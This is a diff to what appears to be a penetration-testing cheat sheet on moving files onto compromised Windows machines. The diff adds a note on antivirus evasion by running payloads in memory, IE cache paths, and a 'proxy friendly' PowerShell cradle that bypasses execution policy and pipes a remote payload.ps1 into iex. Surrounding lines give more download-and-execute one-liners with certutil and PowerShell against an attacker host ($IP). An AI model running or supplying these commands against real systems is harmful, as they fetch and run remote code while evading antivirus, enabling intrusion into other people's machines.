@@ -407,7 +407,12 @@ ____
 Windows XP and earlier: TFTP, Impacket
 Windows 7 - 8.1: Certutil, bitsadmin, Impacket, PowerShell    
 Windows 10: Certutil, Impacket, Curl, Powershell   
+AV evasion - execute payload in memory and don't write to disk.    
 
+IE Local cache for objects downloaded over HTTP (depending on Windows version):    
+
+    C:\Users\<username>\AppData\Local\Microsoft\Windows\Temporary Internet Files\      
+    C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\<subdir>     
 ### Certutil    
 
     certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
@@ -435,7 +440,9 @@ metasploit tfp server module on Kali
     powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
     powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
     powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Windows\Temp\out  
-    powershell -ep bypass iex (iwr http://$IP/shell.ps1 -useb) 
+    powershell -ep bypass iex (iwr http://$IP/shell.ps1 -useb)    
+
+    powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"           #proxy friendly version      
     
     IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
 ## Crackmapexec     
